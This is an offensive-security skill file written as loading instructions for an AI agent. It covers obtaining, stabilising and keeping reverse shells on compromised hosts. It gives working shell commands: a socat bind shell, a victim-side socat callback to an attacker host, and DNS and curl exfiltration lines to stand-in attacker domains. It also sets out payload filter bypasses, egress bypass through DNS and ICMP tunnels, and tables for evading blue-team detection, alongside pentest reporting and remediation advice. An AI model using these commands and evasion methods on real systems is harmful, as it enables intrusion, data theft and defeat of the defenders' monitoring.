---
name: reverse-shell-techniques
description: >-
  Reverse shell and outbound callback techniques. Use when establishing a shell from a
  compromised host, choosing a payload for a constrained environment, stabilising a TTY,
  or working through egress filtering and detection. Covers language payloads, egress
  bypass, TTY upgrade, and OPSEC.
---

# SKILL: Reverse Shell Techniques

> **AI LOAD INSTRUCTION**: Full coverage of outbound shell acquisition. The one-liners are the
> easy part — `SHELL_CHEATSHEET.md` in this directory has 20+ of them. The hard parts, which
> this skill covers, are: **choosing** the right payload for the target's language and egress
> policy, **catching** it reliably, **stabilising** it into a usable TTY, and **not losing it**
> to a detector or an idle timeout. Base models hand you a bash one-liner and stop.

## 0. RELATED ROUTING

- [SHELL_CHEATSHEET.md](./SHELL_CHEATSHEET.md) — copy-paste one-liners for 20+ languages
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — the usual entry point to a shell
- [injection-checking](../injection-checking/SKILL.md) — P1 router for how you got here
- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) — after the first shell, reach the next network
- [linux-postexploit](../linux-postexploit/SKILL.md) / [windows-postexploit](../windows-postexploit/SKILL.md) — what to do with it
- [windows-av-evasion](../windows-av-evasion/SKILL.md) — when the payload is being blocked
- [traffic-analysis-pcap](../traffic-analysis-pcap/SKILL.md) — for the blue side of these callbacks

---

## 1. DECISION: WHICH PAYLOAD

Choose by what the target can run, not by what you prefer.

| Target condition | Use |
|---|---|
| Linux, `/dev/tcp` available, bash present | bash TCP one-liner |
| Linux, minimal (no bash, no nc) | `socat`, or Python/Perl if present |
| Python 3 present | Python socket + pty payload (best shell quality) |
| Web app (PHP) | `fsockopen` / `proc_open` payload |
| Java app server | JSP webshell or Java `Runtime.exec` |
| Node.js | `child_process` + net socket |
| Windows, PowerShell allowed | `powershell -e` base64 encoded payload |
| Windows, constrained | `certutil`/`bitsadmin` download then execute; or MSHTA/HTA |
| Egress filtered to 80/443 only | bind over HTTP/HTTPS (see §4) |
| No outbound at all | bind shell (target listens) — see §5 |
| Blind / no output channel | OOB (DNS or HTTP) — see §6 |

**Rule:** the *first* shell is for orientation, not for work. Get any shell, then upgrade.

---

## 2. LISTENER REQUIREMENTS

```
nc -lvnp PORT                     # baseline, no job control, no arrow keys
rlwrap nc -lvnp PORT              # adds readline IN the listener
socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT      # full PTY — best
pwncat-cs -lp PORT                # auto-stabilising, scriptable
```

Use `rlwrap` or `socat` from the start where possible — a raw `nc` shell loses history, tab
completion, and Ctrl-C handling the moment you need them.

---

## 3. ENCODING AND FILTER BYPASS

When the payload is mangled by a filter, encode it.

| Filter | Bypass |
|---|---|
| spaces stripped | `${IFS}`, `<`, `%09` (tab), `{cmd,arg}` brace expansion |
| `/` and `.` filtered | `${PATH:0:1}`, glob expansion, `printf` construction |
| quotes filtered | `${IFS}`, octal escapes, `$'\x2f'` |
| base64 blocked | `xxd -r -p`, `base32`, rot13, `uudecode` |
| length limit | staged download (`wget`/`curl` a script) instead of inline |
| shell metachars filtered | invoke the interpreter directly with the payload as a file |
| WAF on request body | see [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) |

**Construct-from-nothing technique** (nothing on the target may be hardcoded):
```bash
# build the string without literal slashes
S=${PATH:0:1}; A=${PATH:5:1}; B=${PATH:8:1}
echo $S $A $B          # / u s
```

**Base64 stage** (safe when quoting is hostile):
```bash
echo 'BASE64_BLOB' | base64 -d | bash
```

---

## 4. EGRESS BYPASS — WHEN THE CALLBACK IS BLOCKED

Outbound is filtered more often than inbound. Test in this order:

| Method | Transport | Note |
|---|---|---|
| direct TCP high port | raw TCP | blocked on most corporates |
| port 80 / 443 | TCP | usually allowed — put a listener on 80/443 |
| HTTP CONNECT via proxy | TCP over proxy | if an env proxy is set, the shell may inherit it |
| DNS tunnel | UDP 53 | egress DNS is rarely blocked; use for control or a full tunnel (iodine/dnscat2) |
| ICMP tunnel | ICMP | allowed when TCP/UDP are not (ptunnel-ng) |
| HTTPS with SNI matching a benign domain | TCP 443 | domain fronting / a CDN-fronted C2 |
| WebSocket | TCP 443 | looks like normal app traffic |
| SSH to a public jump host | TCP 22 | often allowed for admins |

**Proxy-aware shell:**
```bash
export http_proxy=http://proxy:3128
export https_proxy=$http_proxy
# then: curl/wget stages will traverse the proxy
```

**Listener placement:** bind on 443 with TLS if the environment inspects protocols.
`socat OPENSSL-LISTEN:443,cert=…,verify=0 …`.

---

## 5. BIND vs REVERSE

| | Reverse | Bind |
|---|---|---|
| Direction | target → you | you → target |
| Blocked by | egress filtering | ingress firewall / NAT |
| Leaves | a connection *outbound* from the victim | a **listening port** on the victim |
| Detectability | low (looks like outbound app traffic) | high (a new listener is an obvious IOC) |
| Use when | default choice | egress is filtered but you can reach the target |

Bind shell on Linux with `socat`:
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Bind leaves an open port and a process — it is far more exposed during an idle period. Use it
only when reverse is impossible, and close it as soon as you have a pivot.

---

## 6. BLIND / OOB CALLBACKS

When there is no interactive channel, you still have signal:

| Channel | Mechanism | Use |
|---|---|---|
| DNS | `nslookup $(whoami).attacker.tld` | data exfil in a subdomain, low bandwidth |
| HTTP | `curl http://attacker/$(id)` | confirmed execution |
| ICMP | payload in echo request | quiet confirmation |
| file drop | write to a path you can read later | web-root or share |

**Order of value:** confirm execution first (single ping), then establish a channel, only then
worry about interactivity.

---

## 7. TTY STABILISATION

A raw shell dies on the first `Ctrl-C`, has no tab completion, and cannot run `sudo` or `ssh`.

**Linux — Python pty:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z
stty raw -echo; fg
# then press Enter twice
export TERM=xterm-256color
stty rows 50 cols 200
```

**Linux — script(1) fallback:**
```bash
script -qc /bin/bash /dev/null
```

**Linux — socat full PTY** (turn the dumb shell into a real one):
```bash
# attacker
socat file:`tty`,raw,echo=0 TCP-LISTEN:4445,reuseaddr
# victim (from the dumb shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4445
```

**Windows — ConPTY-ish upgrade:**
```powershell
# no true PTY, but this gives a usable interactive shell
powershell -NoP -NonI -W Hidden -Exec Bypass
```

**Verification that it worked:** `Ctrl-C` interrupts without killing the shell, arrow keys recall
history, `stty -a` shows a real terminal, and `top`/`vim` render correctly.

---

## 8. PERSISTENCE OF THE SHELL

A shell that dies at the wrong moment costs the whole engagement.

| Risk | Mitigation |
|---|---|
| idle timeout kills it | keepalive: a periodic no-op over the same channel, or `ServerAliveInterval` for SSH |
| parent process dies | detach (`setsid`, `nohup`, `disown`), or run under `socat`/`screen` |
| session dropped by EDR | re-establish from a second vector before working |
| only one channel | always create **two** independent callbacks |
| operator terminal closes | run the listener inside `tmux`/`screen` |

**Two-channel rule:** never work through a single shell. If it drops mid-exploitation you lose
your position *and* your ability to explain what happened.

---

## 9. DETECTION AND OPSEC

What blue teams look for, so you can avoid it:

| Signal | Mitigation |
|---|---|
| process tree: web server → `/bin/bash -i` | use a payload whose parent looks benign, or re-parent |
| outbound connection to unusual port | use 80/443 |
| long-lived outbound TCP from a server | beacon with jitter; short sessions |
| `/dev/tcp` usage in a shell history | avoid bash TCP where an interpreter is available |
| `nc`/`socat` process on the victim | use interpreter-native sockets (Python) |
| new listener port on the victim (bind shell) | prefer reverse |
| command-line logging (auditd/4688/Sysmon) | avoid literal payload strings; stage and execute |
| TLS JA3/JA4 fingerprint mismatch | use a real client library, not raw sockets, on 443 |

**For an authorised assessment, note in the report which of these you triggered** — the
detection gap is a finding, and triggering nothing tells the client nothing.

---

## 10. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the exact payload used, with the injection point | reproducibility |
| the listener configuration | reproducibility |
| proof of the session: `id`, `hostname`, `uname -a` | establishes access AND context |
| the transport and port used | shows what egress allowed |
| whether stabilisation succeeded | a dumb shell is a weaker finding than a PTY |
| duration survived before detection | measures the detection gap |
| if detected: the alert that fired and how long it took | this is often the most valuable finding of the engagement |

**Do not** dump data to prove a shell works. `id` + `hostname` + `uname -a` is sufficient,
and it keeps the evidence artefact small and clean.

---

## 11. REMEDIATION REFERENCE

1. **Egress** — default-deny outbound; allowlist destinations; log and alert on new
   external flows from servers.
2. **Detection** — alert on shell processes with a web-server parent; on outbound TCP from
   workloads that should never initiate it; on `nc`/`socat`/`ncat` execution.
3. **Hardening** — remove interpreters and clients that are not required; no `curl`/`wget` on
   web servers unless necessary; disable `/dev/tcp` where the shell allows it.
4. **Telemetry** — enable command-line logging (auditd `execve`, Sysmon EID 1, Windows 4688
   with command line) and forward it off-host.
5. **Network segmentation** — servers should not reach the internet directly; go through an
   inspected proxy, and alert on the proxy being used for non-HTTP-like traffic.

---

## 12. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did the callback **arrive at a listener you control**, and from which host? | the channel, with its origin |
| 2 | Was the listener's log the **proof**, or only a shell prompt? | a prompt can be your own terminal |
| 3 | Did a command **execute on the target** and return its output? | not merely a connection |
| 4 | Was the **egress control** tested: the same payload against a blocked port/host? | the control |
| 5 | Did the channel survive the **required duration** (idle, size, timeouts)? | a channel that dies in 60s fails the objective |
| 6 | Did it reach the **goal** - a command's output, a file transfer, a session? | a connection is intermediate |
| 7 | Is the finding **scoped to the egress path** that permitted it? | the remediation is the egress control |

**A callback that arrived at a listener you control, with a command's output returning through it.** A
prompt appearing proves nothing, and the listener's own log is the evidence.

---

## 13. EXECUTION PRIMITIVES

A reverse-shell finding is proven by **a callback arriving at a listener you control, a command executing
on the target with its output returning, and an egress control where the same channel is blocked**. A shell
prompt is not evidence, and a payload that "ran" may have failed to connect.

### 12.1 The listener, and what it actually records

```bash
# THE LISTENER'S LOG IS THE EVIDENCE. Configure it to record the ORIGIN before anything else.
PORT="${PORT:-443}"
echo "=== 1. the listener, with its origin recorded ==="
sudo nc -lvnp "$PORT" 2>&1 | tee /tmp/listener.log &
sleep 1
echo "  nc records the PEER ADDRESS. That address is the attribution: it names WHICH host called back."
echo "  A shell prompt alone does NOT: you cannot tell whether it is the target or your own terminal."
echo
echo "=== 2. the BETTER listener, which logs an identity the target's own shell supplies ==="
cat <<'IDENT'
  THE STRONGEST PROOF IS AN IDENTITY THE TARGET ITSELF EMITS, e.g. the first command you run:
      id; hostname; cat /etc/hostname; ip a
  and the LISTENER'S LOG records both the peer IP AND the payload's own output.
  THE PAIR MATTERS: the peer IP (your listener saw it) + the target's own identity (the target said it).
  A shell prompt gives you NEITHER, and this is the family's central false positive.
IDENT
echo
echo "=== 3. THE CONTROL THAT NOBODY RUNS: the same payload to a BLOCKED destination ==="
cat <<'CONTROL'
  run the SAME payload from the SAME host against a port you KNOW is blocked (or a host that is
  not listening). It must NOT connect, and no session should appear.
  THAT failure is the control proving the successful case was the EGRESS PATH permitting it,
  rather than the payload succeeding regardless.
  AND THE TRUST-BOUNDARY CONTROL: run the payload from the target's OWN network position without
  the pivot, and show it cannot reach the listener - THAT is what a pivot or an egress bypass is for.
CONTROL
echo
echo "=== 4. THE ARRIVAL CHECK, mechanically, before you type anything ==="
echo "  ss -tnp | grep $PORT        <- the established connection, with the peer, on the LISTENER's host"
echo "  the peer address here must match the target you expect. A mismatch means something else"
echo "  connected (a scanner, or your own earlier test)."
```

**The peer address plus the target's own identity is the pair; a shell prompt gives you neither.** The
blocked-destination control is the one nobody runs and the one that proves the egress path was the variable.

### 12.2 Egress bypass, and the honest classification

```bash
cat <<'EGRESS'
  WHEN THE CALLBACK IS BLOCKED (section 4), the finding's nature changes, and it must be reclassified:

    the callback reached the listener                        -> a channel finding
    the callback reached it via an ALLOWED port (443, 53, 80) -> a channel finding, and the EGRESS
                                                                POLICY was the enabler
    the callback reached it via an ALLOWED PROTOCOL on a
      port the policy inspects and did not block              -> a PROTOCOL-CONFUSION finding
    the callback required a PROXY that was itself
      misconfigured (an open forward proxy)                   -> a MISCONFIGURATION finding
    the callback required a DNS tunnel                          -> a channel finding, and the RESOLVER's
                                                                recursion to an external server is the
                                                                misconfiguration
  NAME WHICH. 'we got a shell out' does not say whether the egress control failed, a proxy was open,
  or the protocol was allowed - and those have three different remediations.

  THE MEASUREMENT: for each candidate path, run the payload AND record:
    - the destination port and protocol
    - whether a proxy or a resolver was involved, and which
    - the latency (a DNS tunnel is FAR slower, and the number characterises it)
  and run the BLOCKED-DESTINATION control for each, since the policy may allow one path and not another.
EGRESS
echo
echo "=== the port/protocol matrix, which the report should contain ==="
python3 - <<'PY'
import socket
PATHS = [("443/tcp direct", "a direct callback", "the policy allowed 443 outbound"),
         ("53/udp direct to an external resolver", "a DNS tunnel", "the resolver recursed externally"),
         ("53/tcp", "a DNS tunnel over TCP", "the same, and often overlooked in policy"),
         ("80/tcp direct", "a plain HTTP callback", "the policy allowed 80 outbound"),
         ("8080/3128 forward proxy", "a CONNECT through an open proxy", "the proxy was open"),
         ("the pivot's internal address", "a callback relayed by the pivot", "the pivot's own egress"),
         ("ICMP echo", "an ICMP tunnel", "the policy permitted echo outbound")]
print("%-38s %-30s %s" % ("path", "technique", "the misconfiguration it implies"))
for a,b,c in PATHS: print("%-38s %-30s %s" % (a,b,c))
print()
print("  RUN EACH CANDIDATE and record which SUCCEEDED. The successful one names the finding's class.")
print("  AND: a policy that blocks 443 but allows 53/tcp has not blocked DNS. Test both.")
PY
```

**Name which class it is: a blocked-egress failure, an open proxy, or an allowed protocol have three
different remediations.** A policy blocking 443 while allowing 53/tcp has not blocked DNS.

### 12.3 The channel's durability, and the goal

```bash
echo "=== THE DURABILITY TEST, which decides whether the channel meets the objective ==="
cat <<'DURABLE'
  A SHELL THAT CONNECTS AND DIES IN 60 SECONDS OF IDLE IS NOT A USABLE CHANNEL, and reporting it as
  one is the second most common overstatement in this family.

  MEASURE, and put the numbers in the report:
    idle survival      : how long the channel survives with NO traffic
    throughput         : a known-size transfer, timed (a DNS tunnel is orders of magnitude slower)
    reconnect behaviour: what happens if the listener restarts or the network blips
    keepalive          : whether the payload maintains the session, and how
    max payload size   : the largest single command or transfer that works
  THE FAILURE MODES, and what each indicates:
    dies on idle            -> a NAT/firewall idle timeout on the egress path (MEASURE its length)
    dies on a large transfer-> an MTU or inspection issue; the tunnel's framing does not survive
    dies on a listener restart-> no reconnect logic in the payload
    dies after N minutes    -> a session timeout on the target's own side

  AND THE MEASUREMENT IS THE FINDING: 'the egress path permits a channel that survives 27 minutes of
  idle and transfers 1.2 MB in 41 seconds' is a far stronger statement than 'we got a shell'.
DURABLE
echo
echo "=== THE GOAL, which the channel is intermediate to ==="
cat <<'GOAL'
  a callback that connected but ran nothing      -> a CONNECTIVITY finding only
  a command executed with its output returned    -> an execution finding
  a file transferred into or out of the target   -> a data-transfer finding
  an interactive session stable enough to work   -> a full shell finding
  a channel used to PIVOT further                -> see tunneling-and-pivoting
  AND THE EVIDENCE FOR EACH IS DIFFERENT:
    the connectivity finding needs the listener's log with the peer address
    the execution finding needs a command's OUTPUT
    the data-transfer finding needs the FILE'S CONTENTS and a hash
    the shell finding needs the durability numbers
GOAL
echo
echo "=== the encoding/filter bypass (section 3), with its own pair ==="
echo "  if a command was blocked by an input filter and an ENCODING let it through, the pair is:"
echo "    the plain form   -> REFUSED, with the filter's own error or a truncated result"
echo "    the encoded form -> the same command's OUTPUT"
echo "  that pair is the finding. An encoded command that ran is not proof of a filter bypass unless"
echo "  the plain form was shown to fail."
```

**A channel that dies on 60 seconds of idle is not a usable channel, and the durability numbers are the
finding.** An encoded command that ran is not a filter bypass unless the plain form was shown to fail.

### 12.4 The end-to-end harness

```bash
python3 - <<'PY'
print("=== REVERSE SHELL ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the listener recorded the PEER ADDRESS, and it matches the expected target",
  "a shell prompt does not identify the host"),
 ("the TARGET'S OWN identity was captured (id, hostname, its own IP) through the channel",
  "the pair of the peer address and the target's own claim is the attribution"),
 ("a command EXECUTED on the target with its OUTPUT returned through the channel",
  "a connection is not execution"),
 ("the BLOCKED-DESTINATION control was run: the same payload to a blocked port/host did NOT connect",
  "the egress path must be shown to be the variable"),
 ("the egress class is named: allowed port, allowed protocol, open proxy, or a resolver",
  "three different remediations, and 'we got a shell out' names none"),
 ("the port/protocol matrix was tested, including 53/tcp as well as 53/udp",
  "a policy that blocks 443 has not blocked DNS"),
 ("the DURABILITY was measured: idle survival, throughput, and the largest transfer",
  "a channel that dies in 60 seconds is not a usable channel"),
 ("for a filter bypass: the PLAIN form was shown to be REFUSED before the encoded form worked",
  "an encoded command that ran is not a bypass proof"),
 ("the payload's OPSEC context is recorded: the process name, the parent, and the resulting event",
  "the detection is the finding's other half"),
 ("the GOAL is named: connectivity, execution, data transfer, or a session",
  "each needs different evidence, and 'we got a shell' states none"),
 ("the finding is scoped to the EGRESS PATH and the target's network position",
  "the remediation is the egress control, not the payload"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  listener : the port, the bind, and the peer address recorded")
print("  target   : the identity the target itself emitted")
print("  channel  : the path class (port/protocol/proxy/resolver), and the blocked control")
print("  proof    : the command's output, or the file with its hash")
print("  durability: idle survival, throughput, reconnect behaviour")
print("  goal     : connectivity / execution / transfer / session")
PY
```

**Listener, target identity, channel class with its blocked control, proof, durability, goal.** The
durability line and the blocked control are what separate a channel finding from a lucky connection.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [tunneling-and-pivoting](../tunneling-and-pivoting/SKILL.md) - where a channel becomes a route deeper in
- [infrastructure-network-pentesting](../infrastructure-network-pentesting/SKILL.md) - the segmentation the egress path crosses
- [cloudflare-waf-recon-survival](../cloudflare-waf-recon-survival/SKILL.md) - the edge-level controls a callback faces
- [edr-bypass-techniques](../edr-bypass-techniques/SKILL.md) - the endpoint layer the payload's process faces
- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) - when the target is itself confined
